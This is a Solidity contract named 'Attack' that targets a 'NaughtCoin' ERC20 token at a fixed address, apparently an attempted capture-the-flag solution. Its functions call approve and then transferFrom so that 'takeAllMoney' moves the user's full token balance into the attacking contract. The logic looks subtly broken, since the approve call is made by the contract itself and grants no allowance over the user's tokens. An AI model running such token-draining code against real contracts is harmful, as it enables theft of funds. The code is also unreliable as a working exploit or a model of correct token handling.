// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";

interface NaughtCoin is IERC20 {
    function transfer(address _to, uint256 _value) external override returns(bool);

}
contract Attack {
    

NaughtCoin _contractAddress = NaughtCoin(0x6355E41F9D60120acdBB827e5E87aa38E3796165);
uint public balanceOfUser = _contractAddress.balanceOf(tx.origin);

function approvalOfTOken() public {
    _contractAddress.approve(address(this),1000000);

}

function getAllowance() public view returns(uint) {
uint amount = _contractAddress.allowance(tx.origin,address(this));
return amount;
}
function takeAllMoney()public{
     
    _contractAddress.transferFrom(msg.sender,address(this),balanceOfUser);
}

}